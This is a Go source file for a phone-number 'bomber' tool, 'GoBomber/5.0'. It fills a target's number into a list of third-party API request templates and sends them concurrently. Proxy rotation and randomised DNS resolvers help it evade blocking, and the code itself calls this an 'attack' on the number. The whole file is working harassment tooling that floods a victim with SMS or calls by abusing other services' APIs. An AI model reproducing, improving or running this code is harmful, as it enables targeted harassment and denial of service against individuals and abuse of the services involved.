package main

import (
	"context"
	"crypto/tls"
	"encoding/json"
	"fmt"
	"log"
	"net"
	"os"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"github.com/valyala/fasthttp"
	"github.com/valyala/fasthttp/fasthttpproxy"
)

type API struct {
	Type    string `json:"Type"`
	Request struct {
		URL     string         `json:"URL"`
		Method  string         `json:"Method"`
		Payload map[string]any `json:"Payload"`
		Headers map[string]any `json:"Headers"`
	} `json:"Request"`
}

// Bomber struct encapsulates the state and logic for the attack.
type Bomber struct {
	clients      []*fasthttp.Client
	clientIndex  atomic.Uint64
	apiTemplates []API
	stats        struct {
		success int32
		failed  int32
		total   int32
	}
}

func NewBomber(apis []API, proxies []string) (*Bomber, error) {
    var clients []*fasthttp.Client

    useCustomDNS := len(proxies) == 0
    

    if len(proxies) > 0 {
        for _, proxy := range proxies {
            client := &fasthttp.Client{
                Name:            "GoBomber/5.0",
                MaxConnsPerHost: 20,
                ReadTimeout:     20 * time.Second,
                WriteTimeout:    20 * time.Second,
				TLSConfig: &tls.Config{
					InsecureSkipVerify: os.Getenv("ALLOW_INSECURE") == "true",
				},
            }
            switch {
            case strings.HasPrefix(proxy, "socks5://"):
                client.Dial = fasthttpproxy.FasthttpSocksDialer(proxy)
            case strings.HasPrefix(proxy, "http://"), strings.HasPrefix(proxy, "https://"):
                client.Dial = fasthttpproxy.FasthttpHTTPDialer(proxy)
            default:
                log.Printf("%s[WARN] Skipping invalid proxy format: %s%s", ColorYellow, proxy, ColorReset)
                continue
            }
            clients = append(clients, client)
        }
    }

    // Always add a default client
    var defaultClient *fasthttp.Client
    if useCustomDNS {
        defaultClient = &fasthttp.Client{
            Name:            "GoBomber/5.0-Direct",
            MaxConnsPerHost: 200,
            ReadTimeout:     15 * time.Second,
            WriteTimeout:    15 * time.Second,
            Dial: func(addr string) (net.Conn, error) {
                host, port, err := net.SplitHostPort(addr)
                if err != nil {
                    return nil, err
                }

				ip, _, _ := RandomDNS()
                resolver := &net.Resolver{
                    PreferGo: true,
                    Dial: func(ctx context.Context, network, address string) (net.Conn, error) {
                        d := net.Dialer{Timeout: 5 * time.Second}
                        return d.DialContext(ctx, "udp", ip+":53")
                    },
                }

                ips, err := resolver.LookupHost(context.Background(), host)
                if err != nil {
                    return nil, err
                }

                d := net.Dialer{Timeout: 15 * time.Second, KeepAlive: 15 * time.Second}
                return d.Dial("tcp", net.JoinHostPort(ips[0], port))
            },
        }
    } else {
        defaultClient = &fasthttp.Client{
            Name:            "GoBomber/5.0-Direct",
            MaxConnsPerHost: 200,
            ReadTimeout:     15 * time.Second,
            WriteTimeout:    15 * time.Second,
        }
    }

    clients = append(clients, defaultClient)
    log.SetFlags(0)
    return &Bomber{clients: clients, apiTemplates: apis}, nil
}


func (b *Bomber) getNextClient() *fasthttp.Client {
	idx := b.clientIndex.Add(1) - 1
	return b.clients[int(idx%uint64(len(b.clients)))]
}

func (b *Bomber) requestAPI(ctx context.Context, apiTemplate API, phoneNumber string) {
	req := fasthttp.AcquireRequest()
	resp := fasthttp.AcquireResponse()
	defer fasthttp.ReleaseRequest(req)
	defer fasthttp.ReleaseResponse(resp)

	reqData := apiTemplate.Request
	finalURL := strings.ReplaceAll(reqData.URL, "{{num}}", phoneNumber)
	req.SetRequestURI(finalURL)
	req.Header.SetMethod(reqData.Method)

	for key, value := range reqData.Headers {
		req.Header.Set(key, fmt.Sprintf("%v", value))
	}

	if len(reqData.Payload) > 0 {
		req.Header.SetContentType("application/json")
		finalPayload := make(map[string]any)
		for k, v := range reqData.Payload {
			if strVal, ok := v.(string); ok {
				finalPayload[k] = strings.ReplaceAll(strVal, "{{num}}", phoneNumber)
			} else {
				finalPayload[k] = v
			}
		}
		bodyBytes, _ := json.Marshal(finalPayload)
		req.SetBody(bodyBytes)
	}

	client := b.getNextClient()
	err := client.DoTimeout(req, resp, 20*time.Second)

	if err != nil {
		atomic.AddInt32(&b.stats.failed, 1)
		log.Printf("%s[ FAILED ]%s %-60s %s(Error: %v)%s",
			ColorRed, ColorReset, apiTemplate.Request.URL, ColorRed, err, ColorReset)
		return
	}

	statusCode := resp.StatusCode()
	if statusCode >= 200 && statusCode < 300 {
		atomic.AddInt32(&b.stats.success, 1)
		log.Printf("%s[ SUCCESS ]%s %-60s %s(Status: %d)%s",
			ColorGreen, ColorReset, apiTemplate.Request.URL, ColorGreen, statusCode, ColorReset)
	} else {
		atomic.AddInt32(&b.stats.failed, 1)
		log.Printf("%s[ FAILED ]%s %-60s %s(Status: %d)%s",
			ColorRed, ColorReset, apiTemplate.Request.URL, ColorRed, statusCode, ColorReset)
	}
}

// SendRequests launches the concurrent attack.
func (b *Bomber) SendRequests(phoneNumber string, concurrency int) {
	var wg sync.WaitGroup
	semaphore := make(chan struct{}, concurrency)
	b.stats.total = int32(len(b.apiTemplates))

	fmt.Printf("%s[INFO]%s Starting attack on %s%s%s with %d concurrent workers for %d APIs.%s\n\n",
		ColorGreen, ColorYellow, ColorGreen, phoneNumber, ColorYellow, concurrency, int(b.stats.total), ColorReset)

	for _, api := range b.apiTemplates {
		wg.Add(1)
		go func(api API) {
			defer wg.Done()
			semaphore <- struct{}{}
			defer func() { <-semaphore }()

			ctx, cancel := context.WithTimeout(context.Background(), 25*time.Second)
			defer cancel()
			b.requestAPI(ctx, api, phoneNumber)
		}(api)
	}
	wg.Wait()
}

// GetStats returns the final attack statistics.
func (b *Bomber) GetStats() (total, success, failed int32) {
	return b.stats.total, atomic.LoadInt32(&b.stats.success), atomic.LoadInt32(&b.stats.failed)
}